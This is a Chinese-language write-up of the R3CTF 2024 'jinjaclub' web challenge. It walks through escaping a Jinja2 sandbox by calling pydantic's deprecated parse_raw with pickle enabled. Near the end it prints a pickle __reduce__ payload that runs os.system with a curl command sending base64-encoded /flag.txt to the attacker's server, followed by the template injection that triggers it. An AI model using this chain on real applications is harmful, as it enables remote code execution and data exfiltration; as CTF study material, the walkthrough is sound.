---
title: "R3CTF 2024 web jinjaclub wp"
date: 2024-06-12 13:21
updated: 2024-06-12 13:21
categories: "Notes"
tags:
  - "Web Security"
  - "Writeup"
  - "Python"
  - "Reverse"
description: "一个web手不看web看起取证来了（不会web），我为什么会做这样的梦 高贵的纯血web题 R3CTF是这样的，出题人只要留沙箱就可以了，而ctfer要考虑的事情就多了 呼，点进去一看发现名牌ssti还给了python源码 from jinja2.sandbox import SandboxedEn"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18243707"
---
一个web手不看web看起取证来了（不会web），我为什么会做这样的梦

高贵的纯血web题

> R3CTF是这样的，出题人只要留沙箱就可以了，而ctfer要考虑的事情就多了

呼，点进去一看发现名牌ssti还给了python源码

```
from jinja2.sandbox import SandboxedEnvironment
from jinja2.exceptions import UndefinedError
from fastapi import FastAPI, Form
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing_extensions import Annotated
from typing import Union

app = FastAPI()

class User(BaseModel):
    name: str
    description: Union[str, None] = None
    age: int

class Template(BaseModel):
    source: str

@app.get("/", response_class=HTMLResponse)
def index():
  return 'TEST_OUTPUT'
@app.get("/preview", response_class=HTMLResponse)
def preview_page():
    return """
 // SOME THING THERE
<body>
    <div class="container">
        <h1>Mailer Preview</h1>
        <p>Customize your ninja message:</p>
        <form id="form" onsubmit="handleSubmit(event);">
            <label for="name">Name variable:</label>
            <input id="name" name="name" value="John" />

            <label for="description">Description variable:</label>
            <input id="description" name="description" placeholder="Describe yourself here..." />

            <label for="age">Age variable:</label>
            <input id="age" name="age" type="number" value="18" />

            <label for="template">Template:</label>
            <textarea id="template" name="template" rows="10">Hello {{user.name}}, are you older than {{user.age}}?</textarea>
            
            <button type="submit">Preview</button>
        </form>
        <div id="output">Preview will appear here...</div>
    </div>
    <script>
        function handleSubmit(event) {
            event.preventDefault();
            const data = new FormData(event.target);
            const body = {user: {}, template: {source: data.get('template')}};
            body.user.name = data.get('name');
            body.user.description = data.get('description');
            body.user.age = data.get('age');
            
            fetch('/preview', {
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(body)
            })
            .then(response => response.text())
            .then(html => document.getElementById('output').innerHTML = html)
            .catch(error => console.error('Error:', error));
        }
    </script>
</body>
// SOME THING THERE
""" 
@app.post("/preview", response_class=HTMLResponse)
def submit_preview(template: Template, user: User):
    env = SandboxedEnvironment()
    try:
        preview = env.from_string(template.source).render(user=user)
        return preview
    except UndefinedError as e:
        return e
```

我当时一看以为出题人善心大发送我这菜逼一题，然后我看到了这个

```
env = SandboxedEnvironment()
```

想什么呢，出题的哪有这么善良（︶^︶）

VSCODE里F12看SandboxedEnvironment()的defination，好嘛

![](/images/migrated/18243707/01.png)

WHAT CAN I SAY! 下划线，mro 这些东西全寄了

唔，那就看看有什么能用的吧。。。

源文件第189行打断点，VSCODE ctrl+B 开工！

![](/images/migrated/18243707/02.png)

发现User类，找到线索

![](/images/migrated/18243707/03.png)

有json？有东西啊

User里还有别的方法，截图截不过来了，这里给几个关键的

![](/images/migrated/18243707/04.png)

看到parse系列，瞬间释怀

对着BaseModel按F12，然后Ctrl+F，看看parse\_file方法吧（￣︶￣）↗　

![](/images/migrated/18243707/05.png)

抓到你啦，源文件第1179行

allow\_pickle？有点可疑，顺着往下看

![](/images/migrated/18243707/06.png)

看起来这个是传文件（load file）。。。有没有直接传字符串的呢？

回去看，欸，发现parse\_raw，相关代码（就在parse\_file上面）

```
    def parse_raw(  # noqa: D102
        cls: type[Model],
        b: str | bytes,
        *,
        content_type: str | None = None,
        encoding: str = 'utf8',
        proto: DeprecatedParseProtocol | None = None,
        allow_pickle: bool = False,
    ) -> Model:  # pragma: no cover
        warnings.warn(
            'The `parse_raw` method is deprecated; if your data is JSON use `model_validate_json`, '
            'otherwise load the data then use `model_validate` instead.',
            category=PydanticDeprecatedSince20,
        )
        from .deprecated import parse

        try:
            obj = parse.load_str_bytes(
                b,
                proto=proto,
                content_type=content_type,
                encoding=encoding,
                allow_pickle=allow_pickle,
            )
        except (ValueError, TypeError) as exc:
            import json

            # try to match V1
            if isinstance(exc, UnicodeDecodeError):
                type_str = 'value_error.unicodedecode'
            elif isinstance(exc, json.JSONDecodeError):
                type_str = 'value_error.jsondecode'
            elif isinstance(exc, ValueError):
                type_str = 'value_error'
            else:
                type_str = 'type_error'

            # ctx is missing here, but since we've added `input` to the error, we're not pretending it's the same
            error: pydantic_core.InitErrorDetails = {
                # The type: ignore on the next line is to ignore the requirement of LiteralString
                'type': pydantic_core.PydanticCustomError(type_str, str(exc)),  # type: ignore
                'loc': ('__root__',),
                'input': b,
            }
            raise pydantic_core.ValidationError.from_exception_data(cls.__name__, [error])
        return cls.model_validate(obj)

    @classmethod
    @typing_extensions.deprecated(
        'The `parse_file` method is deprecated; load the data from file, then if your data is JSON '
        'use `model_validate_json`, otherwise `model_validate` instead.',
        category=None,
    )
```

找到目标，上链接！>>> [开发手册](https://docs.pydantic.dev/1.10/usage/models/#model-properties)

![](/images/migrated/18243707/07.png)

HELPER FUNCTIONS接着看

![](/images/migrated/18243707/08.png)

OHHHHH，这么大个警告哈哈哈哈哈哈哈哈这开发者真的很怕这里出问题

[github找源码](https://github.com/pydantic/pydantic/blob/main/pydantic/deprecated/parse.py)，找到对应位置

![](/images/migrated/18243707/09.png)

发现满足proto="pickle"直接能pickle.loads()

（这有点逆天了）

getflag咯，典典典的pickle脚本~

```
import os
import pickle
import base64

class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def __reduce__(self):
        return (eval, ("__import__('os').system('curl YOUR VPS`cat /flag.txt|base64`')",))

user = User("HACKER", "FLAG")
print(pickle.dumps(user).hex())
```

结束！

```
任意处：{{user.parse_raw("".encode("utf-8").fromhex("YOUR HEX"), proto="pickle", allow_pickle=True)}}
```

这个故事告诉我们：不要乱用意义不明的（尤其是被deprecated的）接口，攻击时着重看这些☆意义不明☆的接口没准能有收获
